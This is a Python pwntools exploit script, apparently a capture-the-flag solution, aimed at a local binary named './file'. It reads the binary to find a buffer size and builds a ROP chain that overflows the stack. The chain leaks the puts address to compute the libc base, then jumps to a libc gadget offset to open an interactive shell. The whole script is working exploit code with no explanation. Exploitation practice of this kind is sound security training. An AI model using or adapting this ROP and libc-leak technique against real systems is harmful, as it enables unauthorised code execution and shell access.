from pwn import *
import re

context.arch='amd64'
context.log_level = "debug"

x = process("./file")
e = ELF("./file")

raw =open("./file", "rb").read()
idx = raw.index("H\x8d\x85")
buf_size = 0x100000000-u32(raw[idx+3:idx+7]) + 8

main = raw.index("\x55\x48\x89\xe5\x48\x81\xec") + 0x400000
print(hex(main))

r = ROP(e)
r.raw("a"*buf_size)
r.puts(e.got['puts'])
r.raw(main) # to main

#print r.dump()

x.sendlineafter("name? ", r.chain())
x.recvline()
x.recvline()
puts = x.recvline()[:-1]+"\x00\x00"
print(puts)
libcbase = u64(puts) - 0x809c0


print(hex(libcbase))

r = ROP(e)
r.raw("a"*0x158)
r.raw(libcbase + 0x10a38c)

x.sendlineafter("name? ", r.chain())
x.interactive()